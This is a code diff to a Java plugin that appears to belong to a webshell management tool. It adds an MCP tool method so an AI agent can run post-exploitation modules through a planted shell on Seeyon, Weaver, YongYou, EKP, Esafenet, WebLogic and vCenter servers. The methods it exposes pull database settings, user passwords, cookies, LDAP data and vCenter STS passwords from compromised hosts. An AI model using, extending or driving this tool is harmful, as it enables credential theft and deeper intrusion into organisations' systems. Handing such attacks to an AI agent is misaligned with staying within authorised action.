@@ -31,6 +31,9 @@ import oracle.jdbc.replay.OracleDataSource;
 import org.fife.ui.rtextarea.RTextScrollPane;
 import util.automaticBindClick;
 import util.functions;
+import core.annotation.McpTool;
+import core.annotation.McpParam;
+import java.util.Map;
 import util.http.ReqParameter;
 
 
@@ -298,6 +301,49 @@ public class OaTools implements Plugin {
 
     public OaTools() {
         $$$setupUI$$$();
+    }
+
+    @McpTool(name = "proxy", desc = "OA 系统信息提取 (Seeyon/Weaver/YongYou/Ekp/hrms/Esafenet/Weblogic/vCenter)", params = {
+            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
+            @McpParam(name = "target", required = true, desc = "seeyon/weaver/yongyou/hrms/ekp/esafenet/weblogic/vcenter"),
+            @McpParam(name = "method", required = true, desc = "如 GetDb/GetUser/GetPass/GetVms/GetHost/GetCookie/GetvmwSTSPassword/GetLdapInfo/GetAdminUser/GetAdmindo") })
+    public String mcpProxy(Map<String, Object> args) {
+        String target = String.valueOf(args.get("target"));
+        String method = String.valueOf(args.get("method"));
+        String proxy = proxyName(target);
+        if (proxy == null) return "未知 target: " + target;
+        if (!loadProxy(target)) return "插件加载失败: " + target;
+        try {
+            ReqParameter reqParameter = new ReqParameter();
+            byte[] r = this.payload.evalFunc(proxy, method, reqParameter);
+            return this.encoding.Decoding(r);
+        } catch (Exception e) {
+            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
+        }
+    }
+
+    private String proxyName(String target) {
+        if ("seeyon".equalsIgnoreCase(target)) return "SeeyonProxy";
+        if ("weaver".equalsIgnoreCase(target)) return "WeaverProxy";
+        if ("yongyou".equalsIgnoreCase(target)) return "YongYouProxy";
+        if ("hrms".equalsIgnoreCase(target)) return "hrmsProxy";
+        if ("ekp".equalsIgnoreCase(target)) return "EkpProxy";
+        if ("esafenet".equalsIgnoreCase(target)) return "EsafenetProxy";
+        if ("weblogic".equalsIgnoreCase(target)) return "WeblogicProxy";
+        if ("vcenter".equalsIgnoreCase(target)) return "vCenterProxy";
+        return null;
+    }
+
+    private boolean loadProxy(String target) {
+        if ("seeyon".equalsIgnoreCase(target)) return Seeyonload();
+        if ("weaver".equalsIgnoreCase(target)) return Weaverload();
+        if ("yongyou".equalsIgnoreCase(target)) return YongYouload();
+        if ("hrms".equalsIgnoreCase(target)) return hrmsload();
+        if ("ekp".equalsIgnoreCase(target)) return Ekpload();
+        if ("esafenet".equalsIgnoreCase(target)) return Esafenetload();
+        if ("weblogic".equalsIgnoreCase(target)) return Weblogicload();
+        if ("vcenter".equalsIgnoreCase(target)) return vCenterload();
+        return false;
     }
 
     public void init(ShellEntity shellEntity) {
